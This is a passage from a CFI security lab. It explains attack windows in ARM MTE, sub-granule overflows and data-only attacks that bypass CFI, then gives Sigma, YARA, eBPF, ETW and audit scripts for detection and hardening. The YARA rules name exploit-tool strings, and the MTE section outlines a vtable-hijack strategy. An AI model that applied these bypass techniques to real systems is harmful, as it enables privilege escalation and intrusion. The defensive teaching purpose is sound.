      └── If corrupted data is a length/flag → DATA-ONLY ATTACK
      
  T3: Next kernel entry (syscall, interrupt, context switch)
      └── Kernel checks TFSRE0_EL1
      └── Delivers SIGSEGV with SEGV_MTEASERR
      └── TOO LATE — damage already done at T2
  
  Window size: T1 to T3
  - Minimum: a few instructions (if syscall follows immediately)
  - Maximum: unbounded (pure userspace computation between T1 and T3)
  - Typical: hundreds to thousands of instructions
  
  ATTACK STRATEGY:
  1. Overflow corrupts vtable pointer (adjacent allocation, wrong tag)
  2. Immediately call virtual method through corrupted vtable
  3. Hijack succeeds BEFORE kernel delivers async MTE fault
  4. Exploit payload runs; async fault arrives too late
  
  DEFENSE:
  - Use SYNC mode for security-critical allocations (3-5% overhead)
  - Use ASYMMETRIC mode: sync for stores, async for loads
    → Catches the overflow WRITE at T1 (synchronous)
    → Only loads through mis-tagged pointers are deferred
  - Asymmetric mode is the recommended production configuration
""")


def simulate_sub_granule_overflow():
    """Demonstrate sub-granule overflow invisibility to MTE."""
    print(f"\n{'=' * 60}")
    print(f" SUB-GRANULE OVERFLOW (MTE-INVISIBLE)")
    print(f"{'=' * 60}")
    
    # Simulate a struct within a single 16-byte granule
    print(f"""
  MTE checks at 16-byte granule boundaries.
  Overflow WITHIN a single granule is INVISIBLE to MTE.
  
  Example: struct within one granule (16 bytes)
  
  Granule (tag=0x7):
  ┌─────────────────────────────────────────┐
  │ [0-7]:  user_data (char[8])             │ ← attacker overflows from here
  │ [8-15]: is_admin (uint64_t) = 0         │ ← into here (same granule!)
  └─────────────────────────────────────────┘
  
  Attack: write 9+ bytes into user_data
  - Bytes 0-7: written with tag 0x7 → matches granule tag → NO FAULT
  - Bytes 8-15: still within same granule → tag 0x7 → NO FAULT
  - Result: is_admin = attacker-controlled value
  - MTE never triggers because no granule boundary crossed!
  
  Adjacent granule (tag=0xA):
  ┌─────────────────────────────────────────┐
  │ [16-31]: next_allocation                │ ← MTE catches overflow HERE
  └─────────────────────────────────────────┘
  
  Attack: write 17+ bytes → crosses into tag 0xA granule
  - Byte 16+: written with tag 0x7 → MISMATCH with granule tag 0xA
  - MTE TRIGGERS! (sync: immediate fault; async: deferred)
""")
    
    # Calculate attack scenarios
    print(f"  SUB-GRANULE ATTACK SCENARIOS:")
    print(f"  ────────────────────────────────")
    
    scenarios = [
        ("Adjacent int32 flag (4B overflow)", 4, True),
        ("Adjacent pointer (8B overflow)", 8, True),
        ("Cross-granule pointer (17B overflow)", 17, False),
        ("Same-granule length field (2B overflow)", 2, True),
    ]
    
    print(f"  {'Scenario':<45} {'Overflow':<10} {'MTE Detects?'}")
    print(f"  {'-'*45} {'-'*10} {'-'*12}")
    for name, overflow_bytes, invisible in scenarios:
        crosses_granule = overflow_bytes > GRANULE_SIZE
        if not crosses_granule and invisible:
            detection = "NO (same granule)"
        else:
            detection = "YES (cross-granule)"
        print(f"  {name:<45} {overflow_bytes:>3}B      {detection}")
    
    print(f"\n  DEFENSE against sub-granule attacks:")
    print(f"    - Allocator padding: ensure each allocation starts at granule boundary")
    print(f"    - Struct layout: place security-critical fields in separate granules")
    print(f"    - Compiler support: -fsanitize=memtag-stack with per-variable tagging")
    print(f"    - Memory-safe languages (Rust/Swift): eliminate overflow entirely")


def mte_deployment_status():
    """Current MTE deployment status and recommendations."""
    print(f"\n{'=' * 60}")
    print(f" MTE DEPLOYMENT STATUS (2025)")
    print(f"{'=' * 60}")
    print(f"""
  Hardware:
    - Google Tensor G3 (Pixel 8/8 Pro): FIRST mass-market MTE device
    - Arm Cortex-X4+, Neoverse V2+: server/high-performance MTE
    - NOT on Apple Silicon (Apple uses PAC instead)
  
  Software:
    - Android 14+: MTE opt-in per app (android:memtagMode=sync|async)
    - Linux kernel 5.10+: user-space MTE support
    - Linux kernel 5.12+: KASAN-MTE (kernel heap tagging)
    - Chrome on Android: PartitionAlloc MTE integration
    - Scudo allocator: full MTE support (default Android allocator)
    - glibc: MTE support in development
    - musl libc: experimental MTE
  
  Recommended configuration:
    Security-critical servers: PR_MTE_TCF_SYNC (max security, 3-5% overhead)
    Production apps: PR_MTE_TCF_ASYMM (sync writes, async reads, ~2%)
    Performance-sensitive: PR_MTE_TCF_ASYNC (1-2% overhead, weaker detection)
""")


if __name__ == "__main__":
    simulate_tag_reuse_uaf()
    simulate_async_mte_window()
    simulate_sub_granule_overflow()
    mte_deployment_status()
```

---

### Exercise 8: Data-Only Attacks Bypassing All CFI

**Objective:** Understand and demonstrate how data-only attacks render all CFI mechanisms irrelevant by operating entirely outside the control-flow plane.

```python
#!/usr/bin/env python3
"""data_only_bypass_analysis.py — Data-only attack techniques that bypass ALL CFI.

CET, PAC, BTI, MTE, CFG, XFG, Clang CFI — none protect data values.
An attacker who corrupts non-control-flow data achieves exploitation
without triggering any CFI mechanism.
"""


def data_only_attack_taxonomy():
    """Classify data-only attack targets by impact and platform."""
    print(f"{'=' * 70}")
    print(f" DATA-ONLY ATTACKS: CFI-IMMUNE EXPLOITATION")
    print(f"{'=' * 70}")
    
    attacks = [
        {
            "name": "Token/Credential Manipulation",
            "platform": "Windows (all versions)",
            "target": "_TOKEN structure in kernel memory",
            "effect": "Privilege escalation to SYSTEM",
            "cfi_bypassed": "CFG, CET, XFG",
            "real_cve": "CVE-2024-21338 (Lazarus Group)",
            "technique": "Kernel R/W → modify process token → SYSTEM privileges",
        },
        {
            "name": "Page Table Manipulation",
            "platform": "iOS/macOS (A12+, M1+)",
            "target": "Kernel page table entries",
            "effect": "Remap MMIO, disable PAC at hardware level",
            "cfi_bypassed": "PAC (all keys), BTI",
            "real_cve": "CVE-2023-38606 (Operation Triangulation)",
            "technique": "Kernel R/W → PTE modification → MMIO access → disable PAC",
        },
        {
            "name": "cred Structure Manipulation",
            "platform": "Linux (all versions)",
            "target": "task_struct.cred (uid/gid/capabilities)",
            "effect": "Privilege escalation to root",
            "cfi_bypassed": "CET, Clang CFI, grsecurity RAP",
            "real_cve": "Multiple kernel exploits",
            "technique": "Kernel R/W → modify cred.uid to 0 → root",
        },
        {
            "name": "Length/Bounds Field Corruption",
            "platform": "All",
            "target": "Array length fields, bounds check variables",
            "effect": "Convert bounded access to arbitrary R/W",
            "cfi_bypassed": "All CFI mechanisms",
            "real_cve": "V8 TypedArray length confusion",
            "technique": "Overflow into length field → out-of-bounds R/W",
        },
        {
            "name": "Boolean Security Flag",
            "platform": "All",
            "target": "is_authenticated, is_admin, bypass_checks flags",
            "effect": "Skip authentication/authorization",
            "cfi_bypassed": "All CFI mechanisms",
            "real_cve": "Various application-level bugs",
            "technique": "Overflow into boolean → set to true → bypass check",
        },
        {
            "name": "File Descriptor Substitution",
            "platform": "Linux/macOS",
            "target": "File descriptor number in struct",
            "effect": "Read/write arbitrary files",
            "cfi_bypassed": "All CFI mechanisms",
            "real_cve": "Sandbox escape via fd confusion",
            "technique": "Corrupt fd number → operations on wrong file",
        },
    ]
    
    print(f"\n  {'Attack':<35} {'Platform':<20} {'CFI Bypassed'}")
    print(f"  {'-'*35} {'-'*20} {'-'*25}")
    for a in attacks:
        print(f"  {a['name']:<35} {a['platform']:<20} {a['cfi_bypassed']}")
    
    print(f"\n  DETAILED CASE STUDIES:")
    for a in attacks:
        print(f"\n  ╔{'═' * 66}╗")
        print(f"  ║ {a['name']:<65}║")
        print(f"  ╠{'═' * 66}╣")
        print(f"  ║ Platform: {a['platform']:<54}║")
        print(f"  ║ Target:   {a['target']:<54}║")
        print(f"  ║ Effect:   {a['effect']:<54}║")
        print(f"  ║ Bypasses: {a['cfi_bypassed']:<54}║")
        print(f"  ║ CVE:      {a['real_cve']:<54}║")
        print(f"  ║ Method:   {a['technique']:<54}║")
        print(f"  ╚{'═' * 66}╝")
    
    print(f"\n  WHY CFI CANNOT HELP:")
    print(f"  ─────────────────────")
    print(f"  CFI enforces: 'the program follows a legal control-flow graph'")
    print(f"  Data-only attacks: control flow IS legal. Only data operands are corrupted.")
    print(f"  Every instruction executes at its intended address.")
    print(f"  Every return goes to the correct caller.")
    print(f"  Every indirect call reaches a type-valid target.")
    print(f"  The program just processes WRONG DATA.")
    
    print(f"\n  DEFENSES AGAINST DATA-ONLY ATTACKS:")
    print(f"  ────────────────────────────────────")
    defenses = [
        ("Memory-safe languages", "Rust, Swift, Go — eliminate corruption entirely"),
        ("MTE (partial)", "Catches initial heap corruption (15/16 probability)"),
        ("CHERI capabilities", "Hardware bounds checking on every pointer"),
        ("Data-Flow Integrity (DFI)", "Enforce legal data flows (academic, high overhead)"),
        ("Compartmentalization", "Sandbox/MPK — limit damage from corrupted process"),
        ("Credential monitoring", "Detect anomalous token/cred changes (Windows ATP, LKRG)"),
        ("KDP/PPL/HVCI", "Hypervisor protects critical kernel data structures"),
        ("Integrity measurement", "Periodic hash-check of security-critical structures"),
    ]
    for name, desc in defenses:
        print(f"    • {name:<30} {desc}")


if __name__ == "__main__":
    data_only_attack_taxonomy()
```

---

## PART B: DEFENSIVE — Detection, Verification, and Hardening

### Exercise 9: CFI Violation Detection Engineering

**Objective:** Build comprehensive detection for CET violations, PAC failures, MTE faults, and CFG failures using Sigma rules, YARA rules, eBPF programs, and ETW queries.

**Step 1: Sigma rules for cross-platform CFI violations.**

```yaml
# File: sigma_rules/cfi_detection_suite.yml
# Complete Sigma rule suite for CFI violation detection

# Rule 1: CET Shadow Stack Violation (Windows)
title: CET Shadow Stack Violation
id: a3f1e9b2-7c4d-4a8e-b5f1-2d9e8c3a7b01
status: stable
description: |
  Shadow stack mismatch (#CP vector 21, error type NEAR-RET).
  Strong indicator of ROP attack on CET-enabled process.
logsource:
    product: windows
    service: security-mitigations
detection:
    selection:
        EventID: 1
    filter_known_jit:
        ProcessName|endswith:
            - '\java.exe'
            - '\dotnet.exe'
            - '\node.exe'
    condition: selection and not filter_known_jit
falsepositives:
    - JIT-heavy applications during deoptimization
    - Debuggers using SetThreadContext
level: critical
tags:
    - attack.execution
    - attack.t1055

---
# Rule 2: CET IBT Violation (ENDBR missing)
title: CET IBT Violation - Missing ENDBR at Branch Target
id: d4e7f1a3-9b2c-4f5e-a8d1-6c3e9f2b7a04
status: stable
description: |
  Indirect branch landed on instruction without ENDBR64/ENDBR32.
  Indicates JOP/COP attack or injection of non-IBT binary.
logsource:
    product: windows
    service: security-mitigations
detection:
    selection:
        EventID: 1
        ViolationType|contains: 'IBT'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1055.001

---
# Rule 3: Windows CFG Check Failure
title: CFG Indirect Call Validation Failure
id: b8e2d4a1-5f3c-4b9d-a7e2-1c8f6d5a9b03
status: stable
description: |
  FAST_FAIL_GUARD_ICALL_CHECK_FAILURE (code 10).
  Target address not in CFG bitmap — forward-edge hijack attempt.
logsource:
    product: windows
    service: security-mitigations
detection:
    selection:
        EventID: 12
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1574

---
# Rule 4: XFG Type-Hash Mismatch
title: XFG Extended Flow Guard Type Mismatch
id: e5f2a3b4-6c7d-8e9f-0a1b-2c3d4e5f6a7b
status: experimental
description: |
  FAST_FAIL_GUARD_ICALL_CHECK_FAILURE_XFG (code 73).
  Function prototype hash mismatch at indirect call site.
logsource:
    product: windows
    service: security-mitigations
detection:
    selection:
        EventID: 13
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1574.002

---
# Rule 5: Linux CET/CFI Process Crash
title: Linux Process Crash from CET or Clang CFI
id: c7d3e5b2-8a1f-4c6e-b9d3-3e7a2f1c8d05
status: stable
description: |
  SIGSEGV (signal 11, CET #CP → SEGV_CPERR) or
  SIGILL (signal 4, Clang CFI ud2 trap).
logsource:
    product: linux
    service: audit
detection:
    sel_cet:
        type: ANOM_ABEND
        sig: '11'
    sel_cfi:
        type: ANOM_ABEND
        sig: '4'
    filter_common_crashes:
        exe|contains:
            - '/usr/lib/firefox'
            - '/usr/lib/chromium'
    condition: (sel_cet or sel_cfi) and not filter_common_crashes
level: high
tags:
    - attack.execution
    - attack.t1203

---
# Rule 6: ARM MTE Tag Check Failure (Android/Linux)
title: ARM MTE Synchronous Tag Check Failure
id: f6a7b8c9-0d1e-2f3a-4b5c-6d7e8f9a0b1c
status: experimental
description: |
  SEGV_MTESERR (code 9) or SEGV_MTEASERR (code 10) on AArch64.
  Memory corruption detected by hardware memory tagging.
logsource:
    product: linux
    service: audit
detection:
    selection:
        type: ANOM_ABEND
        sig: '11'
    filter_mte:
        # si_code for MTE errors
        si_code|contains: ['MTESERR', 'MTEASERR', '9', '10']
    condition: selection and filter_mte
level: high
tags:
    - attack.execution
    - attack.t1203

---
# Rule 7: Shadow Stack Configuration Tampering
title: Unexpected Shadow Stack Configuration Change
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: |
  arch_prctl with SHSTK opcodes outside process initialization.
  May indicate attacker trying to disable/modify CET.
logsource:
    product: linux
    service: audit
detection:
    selection:
        type: SYSCALL
        syscall: 'prctl'
        a0|contains: ['0x5001', '0x5002', '0x5003', '0x5004']
    filter_init:
        exe|endswith: ['/ld-linux-x86-64.so.2', '/libc.so.6']
    condition: selection and not filter_init
level: medium
tags:
    - attack.defense_evasion
    - attack.t1562
```

**Step 2: YARA rules for CFI enforcement gaps.**

```yara
/* cfi_enforcement_yara.yar — Detect binaries with CFI gaps and bypass tools. */

rule elf_x86_missing_cet_ibt {
    meta:
        description = "x86_64 ELF binary missing CET IBT property"
        severity = "medium"
        action = "Potential IBT bypass vector if loaded in CET-enforcing process"
    strings:
        $elf_magic = { 7f 45 4c 46 }
        $x86_64 = { 3e 00 }  /* EM_X86_64 at e_machine offset */
        /* GNU_PROPERTY_X86_FEATURE_1_IBT = bit 0 of GNU_PROPERTY_X86_FEATURE_1_AND */
        $ibt_property = { 02 00 00 c0 04 00 00 00 (01|03|05|07) }
    condition:
        $elf_magic at 0 and $x86_64 and not $ibt_property
}

rule elf_x86_missing_shstk {
    meta:
        description = "x86_64 ELF binary missing CET Shadow Stack property"
        severity = "medium"
    strings:
        $elf_magic = { 7f 45 4c 46 }
        $x86_64 = { 3e 00 }
        /* GNU_PROPERTY_X86_FEATURE_1_SHSTK = bit 1 */
        $shstk_property = { 02 00 00 c0 04 00 00 00 (02|03|06|07) }
    condition:
        $elf_magic at 0 and $x86_64 and not $shstk_property
}

rule elf_aarch64_missing_bti {
    meta:
        description = "AArch64 ELF binary missing BTI property"
        severity = "medium"
    strings:
        $elf_magic = { 7f 45 4c 46 }
        $aarch64 = { b7 00 }  /* EM_AARCH64 */
        /* GNU_PROPERTY_AARCH64_FEATURE_1_BTI = bit 0 */
        $bti_prop = { 00 00 00 c0 04 00 00 00 (01|03|05|07) }
    condition:
        $elf_magic at 0 and $aarch64 and not $bti_prop
}

rule pe_missing_cfg_guard {
    meta:
        description = "PE binary without CFG instrumentation flag"
        severity = "medium"
    condition:
        uint16(0) == 0x5A4D and
        uint32(uint32(0x3C) + 0x84) & 0x100 == 0
}

rule pe_missing_cet_compat {
    meta:
        description = "PE binary not marked CET compatible"
        severity = "low"
    condition:
        uint16(0) == 0x5A4D and
        /* Check DllCharacteristicsEx for CET compat bit */
        uint32(uint32(0x3C) + 0x84) & 0x4000 != 0 and  /* Has Guard CF */
        true  /* Would need load config parsing for full check */
}

rule cfi_bypass_toolkit_indicators {
    meta:
        description = "CFI/CET/PAC bypass exploit development tool"
        severity = "high"
    strings:
        $s1 = "ENDBR64 gadget" ascii wide nocase
        $s2 = "shadow_stack_desync" ascii wide
        $s3 = "pac_oracle" ascii wide
        $s4 = "pac_bruteforce" ascii wide
        $s5 = "wrss_gadget" ascii wide
        $s6 = "cfg_bitmap_corrupt" ascii wide
        $s7 = "SetProcessValidCallTargets" ascii wide
        $s8 = "xfg_collision" ascii wide
        $s9 = "endbr_harvest" ascii wide
        $s10 = "mte_bypass" ascii wide
        $s11 = "pacman_speculative" ascii wide
        /* Known tool strings */
        $t1 = "ROPgadget" ascii
        $t2 = "ropper" ascii
        $t3 = "one_gadget" ascii
        $t4 = "pwntools" ascii
    condition:
        3 of ($s*) or (2 of ($s*) and any of ($t*))
}

rule wrss_instruction_in_binary {
    meta:
        description = "Binary contains WRSS instruction (shadow stack write)"
        severity = "high"
        note = "WRSS enables shadow stack bypass — should be disabled"
    strings:
        /* WRSSQ: REX.W 0F 38 F6 /r */
        $wrssq = { 48 0f 38 f6 }
        /* WRSSD: 66 0F 38 F5 /r */
        $wrssd = { 66 0f 38 f5 }
    condition:
        uint32(0) == 0x464c457f and  /* ELF */
        any of ($wrss*)
}
```

**Step 3: eBPF CET/PAC violation monitor.**

```c
/* cfi_monitor.bpf.c — eBPF: comprehensive CFI violation monitor.
 * Monitors: CET #CP exceptions, Clang CFI traps, PAC FPAC faults,
 *           MTE tag check failures, suspicious arch_prctl calls.
 *
 * Build: clang -target bpf -O2 -g -c cfi_monitor.bpf.c -o cfi_monitor.bpf.o
 * Load:  bpftool prog load cfi_monitor.bpf.o /sys/fs/bpf/cfi_monitor
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define VIOLATION_CET_SHSTK   0  /* Shadow stack mismatch */
#define VIOLATION_CET_IBT     1  /* ENDBR missing */
#define VIOLATION_CLANG_CFI   2  /* Clang CFI ud2 trap */
#define VIOLATION_PAC_FPAC    3  /* PAC authentication failure */
#define VIOLATION_MTE_SYNC    4  /* MTE synchronous tag mismatch */
#define VIOLATION_MTE_ASYNC   5  /* MTE asynchronous tag mismatch */
#define VIOLATION_SHSTK_TAMPER 6 /* Shadow stack config change */

struct cfi_event {
    __u32 pid;
    __u32 tid;
    __u64 timestamp;
    __u64 instruction_ptr;
    __u32 violation_type;
    __u32 signal;
    char comm[16];
    char exe[64];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 512 * 1024);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u32);   /* PID */
    __type(value, __u64); /* violation count */
} violation_counts SEC(".maps");

static __always_inline void emit_event(__u32 violation_type, __u32 sig) {
    struct cfi_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return;
    
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->pid = pid_tgid >> 32;
    e->tid = pid_tgid & 0xFFFFFFFF;
    e->timestamp = bpf_ktime_get_ns();
    e->violation_type = violation_type;
    e->signal = sig;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    
    /* Increment per-PID violation count */
    __u32 pid = e->pid;
    __u64 *count = bpf_map_lookup_elem(&violation_counts, &pid);
    if (count) {
        __sync_fetch_and_add(count, 1);
    } else {
        __u64 one = 1;
        bpf_map_update_elem(&violation_counts, &pid, &one, BPF_ANY);
    }
    
    bpf_ringbuf_submit(e, 0);
}

/* Monitor signal delivery for CFI-related signals */
SEC("tp/signal/signal_deliver")
int trace_cfi_signals(struct trace_event_raw_signal_deliver *ctx) {
    __u32 sig = ctx->sig;
    
    switch (sig) {
    case 11: /* SIGSEGV — could be CET #CP or MTE */
        emit_event(VIOLATION_CET_SHSTK, sig);
        break;
    case 4:  /* SIGILL — Clang CFI ud2 or PAC FPAC */
        emit_event(VIOLATION_CLANG_CFI, sig);
        break;
    default:
        return 0;
    }
    
    return 0;
}

/* Monitor arch_prctl for shadow stack tampering */
SEC("tracepoint/syscalls/sys_enter_prctl")
int trace_prctl(struct trace_event_raw_sys_enter *ctx) {
    long option = ctx->args[0];
    
    /* ARCH_SHSTK_ENABLE=0x5001, DISABLE=0x5002, LOCK=0x5003, STATUS=0x5004 */
    if (option >= 0x5001 && option <= 0x5004) {
        emit_event(VIOLATION_SHSTK_TAMPER, 0);
    }
    
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

**Step 4: Windows ETW query for CFI events.**

```powershell
# cfi_etw_monitor.ps1 — Monitor CFG/CET/XFG violations via ETW.
# Requires: Administrator privileges, Windows 11 22H2+

param(
    [int]$MaxEvents = 100,
    [switch]$Continuous
)

$ProviderGUID = '{FAE10392-F0AF-4AC0-B8FF-9F4D920C3CDF}'
$ProviderName = 'Microsoft-Windows-Security-Mitigations'

# Event ID mapping
$EventTypes = @{
    1  = 'CET Shadow Stack Violation'
    12 = 'CFG Check Failure'
    13 = 'XFG Type-Hash Mismatch'
    14 = 'CET IBT Violation'
}

Write-Host "=== CFI Violation Monitor ===" -ForegroundColor Cyan
Write-Host "Provider: $ProviderName"
Write-Host "Monitoring event IDs: $($EventTypes.Keys -join ', ')"
Write-Host ""

if ($Continuous) {
    # Real-time monitoring
    $session = New-Object System.Diagnostics.Eventing.Reader.EventLogWatcher(
        New-Object System.Diagnostics.Eventing.Reader.EventLogQuery(
            'Microsoft-Windows-Security-Mitigations/Operational',
            [System.Diagnostics.Eventing.Reader.PathType]::LogName
        )
    )
    
    Register-ObjectEvent -InputObject $session -EventName EventRecordWritten -Action {
        $evt = $Event.SourceEventArgs.EventRecord
        $type = if ($script:EventTypes.ContainsKey($evt.Id)) { 
            $script:EventTypes[$evt.Id] 
        } else { 
            "Unknown ($($evt.Id))" 
        }
        $color = if ($evt.Id -in 1,14) { 'Red' } else { 'Yellow' }
        Write-Host "[$($evt.TimeCreated.ToString('HH:mm:ss.fff'))] " -NoNewline
        Write-Host "$type" -ForegroundColor $color -NoNewline
        Write-Host " — PID: $($evt.ProcessId)"
    }
    
    $session.Enabled = $true
    Write-Host "Monitoring... (Ctrl+C to stop)" -ForegroundColor Green
    while ($true) { Start-Sleep -Seconds 1 }
} else {
    # Historical query
    $events = Get-WinEvent -FilterHashtable @{
        ProviderName = $ProviderName
        Id = @(1, 12, 13, 14)
    } -MaxEvents $MaxEvents -ErrorAction SilentlyContinue

    if ($events) {
        Write-Host "Found $($events.Count) CFI violation events:" -ForegroundColor Yellow
        foreach ($evt in $events) {
            $type = if ($EventTypes.ContainsKey($evt.Id)) { $EventTypes[$evt.Id] } else { "ID:$($evt.Id)" }
            $severity = switch ($evt.Id) {
                1  { 'CRITICAL' }
                14 { 'CRITICAL' }
                12 { 'HIGH' }
                13 { 'HIGH' }
                default { 'MEDIUM' }
            }
            
            Write-Host "  [$severity] $($evt.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')) — $type"
            
            # Extract process info from event XML
            $xml = [xml]$evt.ToXml()
            $procName = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq 'ProcessName' }).'#text'
            $targetAddr = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq 'TargetAddress' }).'#text'
            if ($procName) { Write-Host "         Process: $procName" }
            if ($targetAddr) { Write-Host "         Target:  $targetAddr" }
        }
    } else {
        Write-Host "No CFI violation events found." -ForegroundColor Green
        Write-Host "This is good — no control-flow attacks detected."
    }
}
```

---

### Exercise 10: CFI Deployment Verification and Binary Auditing

**Objective:** Build a comprehensive binary auditing framework that verifies CFI deployment across all loaded libraries in a process.

```bash
#!/usr/bin/env bash
# cfi_coverage_audit.sh — Complete CFI coverage audit for a running system.
# Usage: ./cfi_coverage_audit.sh [pid|binary_path]
set -euo pipefail

TARGET="${1:-}"
TIMESTAMP="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
REPORT_FILE="/tmp/cfi_audit_${TIMESTAMP//[:-]/}.txt"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          CFI COVERAGE AUDIT — $TIMESTAMP          ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# Determine audit mode
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <pid>       — Audit all libraries in running process"
    echo "       $0 <binary>    — Audit binary and its dependencies"
    echo ""
    echo "Auditing system-wide (all running processes)..."
    MODE="system"
elif [ -f "$TARGET" ]; then
    MODE="binary"
    BINARY="$TARGET"
elif [ -d "/proc/$TARGET" ]; then
    MODE="process"
    PID="$TARGET"
else
    echo "[!] Invalid target: $TARGET"
    exit 1
fi

# CET/BTI/PAC property checker
check_elf_cfi() {
    local binary="$1"
    local props ibt shstk bti pac
    
    props=$(readelf -n "$binary" 2>/dev/null || true)
    ibt=$(echo "$props" | grep -q "IBT" && echo "Y" || echo "N")
    shstk=$(echo "$props" | grep -q "SHSTK" && echo "Y" || echo "N")
    bti=$(echo "$props" | grep -q "BTI" && echo "Y" || echo "N")
    pac=$(echo "$props" | grep -q "PAC" && echo "Y" || echo "N")
    
    # Check for Clang CFI symbols
    local cfi_sym
    cfi_sym=$(nm -D "$binary" 2>/dev/null | grep -q '__cfi_check\|__cfi_slowpath' && echo "Y" || echo "N")
    
    # Check for stack canary
    local canary
    canary=$(readelf -s "$binary" 2>/dev/null | grep -q '__stack_chk_fail' && echo "Y" || echo "N")
    
    # Check RELRO
    local relro
    relro=$(readelf -l "$binary" 2>/dev/null | grep -q "GNU_RELRO" && echo "Y" || echo "N")
    
    echo "$ibt|$shstk|$bti|$pac|$cfi_sym|$canary|$relro"
}

audit_process() {
    local pid="$1"
    local proc_name exe
    proc_name=$(cat "/proc/$pid/comm" 2>/dev/null || echo "unknown")
    exe=$(readlink "/proc/$pid/exe" 2>/dev/null || echo "unknown")
    
    echo ""
    echo "┌─ Process: $proc_name (PID $pid)"
    echo "│  Executable: $exe"
    echo "│"
    
    local total=0 ibt_count=0 shstk_count=0 cfi_count=0
    local weak_links=()
    
    mapfile -t libs < <(awk '$6!="" && $2~/x/{print $6}' "/proc/$pid/maps" 2>/dev/null | sort -u)
    
    printf "│  %-45s %s %s %s %s %s %s %s\n" "Library" "IBT" "SHSTK" "BTI" "PAC" "CFI" "CAN" "REL"
    printf "│  %-45s %s %s %s %s %s %s %s\n" "───────" "───" "─────" "───" "───" "───" "───" "───"
    
    for lib in "${libs[@]}"; do
        [ -f "$lib" ] || continue
        total=$((total + 1))
        
        IFS='|' read -r ibt shstk bti pac cfi can rel <<< "$(check_elf_cfi "$lib")"
        
        [ "$ibt" = "Y" ] && ibt_count=$((ibt_count + 1))
        [ "$shstk" = "Y" ] && shstk_count=$((shstk_count + 1))
        [ "$cfi" = "Y" ] && cfi_count=$((cfi_count + 1))
        
        local status_char="│"
        if [ "$ibt" = "N" ] && [ "$shstk" = "N" ] && [ "$bti" = "N" ]; then
            status_char="│!"
            weak_links+=("$lib")
        fi
        
        local short_name
        short_name=$(basename "$lib")
        printf "$status_char %-45s  %s    %s     %s   %s   %s   %s   %s\n" \
               "${short_name:0:45}" "$ibt" "$shstk" "$bti" "$pac" "$cfi" "$can" "$rel"
    done
    
    echo "│"
    echo "│  Summary: $total libraries"
    echo "│    IBT: $ibt_count/$total ($(( total > 0 ? ibt_count * 100 / total : 0 ))%)"
    echo "│    SHSTK: $shstk_count/$total ($(( total > 0 ? shstk_count * 100 / total : 0 ))%)"
    echo "│    Clang CFI: $cfi_count/$total"
    
    if [ ${#weak_links[@]} -gt 0 ]; then
        echo "│"
        echo "│  ⚠ WEAK LINKS (no CFI — may disable process-wide CET):"
        for wl in "${weak_links[@]}"; do
            echo "│    [!] $(basename "$wl")"
        done
        echo "│"
        echo "│  IMPACT: One non-CET DSO can disable shadow stacks process-wide"
        echo "│  ACTION: Recompile with -fcf-protection=full or blocklist (BlockNonCetBinaries)"
    fi
    
    echo "└──────────────────────────────────────────────────────────"
}

case "$MODE" in
    process)
        audit_process "$PID"
        ;;
    binary)
        echo "Auditing: $BINARY"
        echo ""
        echo "Binary properties:"
        IFS='|' read -r ibt shstk bti pac cfi can rel <<< "$(check_elf_cfi "$BINARY")"
        printf "  IBT=%s  SHSTK=%s  BTI=%s  PAC=%s  CFI=%s  Canary=%s  RELRO=%s\n" \
               "$ibt" "$shstk" "$bti" "$pac" "$cfi" "$can" "$rel"
        echo ""
        echo "Dependencies:"
        ldd "$BINARY" 2>/dev/null | awk '/=>/{print $3}' | while read -r lib; do
            [ -f "$lib" ] || continue
            IFS='|' read -r ibt shstk bti pac cfi can rel <<< "$(check_elf_cfi "$lib")"
            printf "  %-45s IBT=%s SHSTK=%s CFI=%s\n" "$(basename "$lib")" "$ibt" "$shstk" "$cfi"
        done
        ;;
    system)
        echo "System-wide CFI audit (sampling running processes)..."
        echo ""
        for pid in $(ps -eo pid --no-headers | head -20); do
            pid=$(echo "$pid" | tr -d ' ')
            [ -d "/proc/$pid" ] || continue
            [ -r "/proc/$pid/maps" ] || continue
            audit_process "$pid" 2>/dev/null || true
        done
        ;;
esac

echo ""
echo "Audit complete. Report: $REPORT_FILE"
```

---

### Exercise 11: CFI Hardening Deployment with CI/CD Verification

**Objective:** Build a complete CI/CD pipeline that enforces CFI on all build artifacts and verifies enforcement before deployment.

```bash
#!/usr/bin/env bash
# cfi_hardening_deploy.sh — Apply maximum CFI hardening and verify.
# Usage: ./cfi_hardening_deploy.sh <project_dir>
set -euo pipefail

PROJECT_DIR="${1:-.}"
TIMESTAMP="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║       CFI HARDENING DEPLOYMENT — $TIMESTAMP       ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# Platform detection
ARCH=$(uname -m)
echo "Architecture: $ARCH"

# === STEP 1: Compiler flags ===
echo ""
echo "┌─ Step 1: Recommended Compiler Flags"
echo "│"

case "$ARCH" in
    x86_64)
        echo "│  CFLAGS/CXXFLAGS:"
        echo "│    -fcf-protection=full          # CET IBT + SHSTK marking"
        echo "│    -fsanitize=cfi-icall           # Clang forward-edge CFI (requires LTO)"
        echo "│    -fsanitize=cfi-vcall           # Virtual call type checking"
        echo "│    -flto                          # Link-Time Optimization (CFI requirement)"
        echo "│    -fvisibility=hidden            # Restrict symbol visibility (CFI hardening)"
        echo "│    -fstack-protector-strong       # Stack canaries (defense-in-depth)"
        echo "│    -D_FORTIFY_SOURCE=3            # Bounds checking on libc functions"
